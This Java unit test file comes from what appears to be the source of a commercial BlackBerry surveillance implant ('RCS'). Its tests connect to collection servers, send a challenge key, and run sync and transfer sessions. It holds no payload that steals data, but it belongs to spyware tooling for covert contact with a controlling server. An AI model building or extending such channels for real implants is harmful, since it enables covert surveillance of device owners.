//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : tests.unit
 * File         : UT_Sync.java
 * Created      : 28-apr-2010
 * *************************************************/
package tests.unit;

import java.io.IOException;

import tests.AssertException;
import tests.TestUnit;
import tests.Tests;
import tests.accessor.TransferAccessor;
import blackberry.config.Keys;
import blackberry.transfer.DirectTcpConnection;
import blackberry.transfer.ProtocolException;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class UT_Sync.
 */
public final class UT_Sync extends TestUnit {

    //#ifdef DEBUG
    static Debug debug = new Debug("UT_Sync", DebugLevel.VERBOSE);

    //#endif

    String host = "rcs-prod";
    //String host = "192.168.1.149";
    int port = 80;

    TransferAccessor transfer;

    boolean remoteTest = false;

    /**
     * Instantiates a new u t_ sync.
     * 
     * @param name
     *            the name
     * @param tests
     *            the tests
     */
    public UT_Sync(final String name, final Tests tests) {
        super(name, tests);
        transfer = new TransferAccessor();
    }

    private void ConnectionRemoteTest() throws AssertException {
        //#ifdef DEBUG_INFO
        debug.info("- ConnectionRemoteTest -");
        //#endif
        final String remoteHost = "iperbole.suppose.it";
        port = 8080;
        final DirectTcpConnection connection = new DirectTcpConnection(
                remoteHost, port, false, 0);
        final boolean connected = connection.connect();
        AssertThat(connected, "not connected");

        try {
            //#ifdef DEBUG_TRACE
            debug.trace("send");
            //#endif
            // connection.send("HelloWorld".getBytes());
            final boolean ret = connection.send(Keys.getInstance()
                    .getChallengeKey());
            AssertThat(ret, "cannot send");
            //#ifdef DEBUG_TRACE
            debug.trace("receive");
            //#endif
            final byte[] rec = connection.receive(5);
            final String string = new String(rec);
            //#ifdef DEBUG_TRACE
            debug.trace("Received: " + string);
            //#endif
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error(e.toString());
            //#endif
        }

        connection.disconnect();
    }

    private void ConnectionTest() throws AssertException {
        //#ifdef DEBUG_INFO
        debug.info("- ConnectionTest -");
        //#endif
        final DirectTcpConnection connection = new DirectTcpConnection(host,
                port, false, DirectTcpConnection.METHOD_NODEVICE);
        final boolean connected = connection.connect();
        AssertThat(connected, "not connected");

        connection.disconnect();
    }

    /*
     * (non-Javadoc)
     * @see tests.TestUnit#run()
     */
    public boolean run() throws AssertException {
        ConnectionTest();
        Utils.sleep(2000);

        if (remoteTest) {
            ConnectionRemoteTest();
            Utils.sleep(2000);
        }

        SyncTest();
        Utils.sleep(2000);

        TransferTest();
        Utils.sleep(2000);

        //TransferSecureTest();
        //Utils.sleep(1000);
        return true;
    }

    private void SyncTest() throws AssertException {
        //#ifdef DEBUG_INFO
        debug.info("- SyncTest -");
        //#endif
        transfer.init(host, port, false, false);

        //#ifdef DEBUG_INFO
        debug.info("transfer sending");

        //#endif
        final boolean ret = transfer.startSession();
        AssertThat(ret == true, "Doesn't send transfer");

    }

    private void TransferSecureTest() throws AssertException {
        //#ifdef DEBUG_INFO
        debug.info("- TransferSecureTest -");
        //#endif
        transfer.init(host, 443, true, false);
        try {
            transfer.ChallengeTest();
        } catch (final ProtocolException e) {
            //#ifdef DEBUG
            debug.error("Protocol exception: " + e);
            //#endif
            throw new AssertException();
        }
    }

    private void TransferTest() throws AssertException {
        //#ifdef DEBUG_INFO
        debug.info("- TransferTest -");
        //#endif
        transfer.init(host, port, false, false);
        try {
            transfer.ChallengeTest();
        } catch (final ProtocolException e) {
            //#ifdef DEBUG
            debug.error("Protocol exception: " + e);
            //#endif
            throw new AssertException();
        }
    }

}
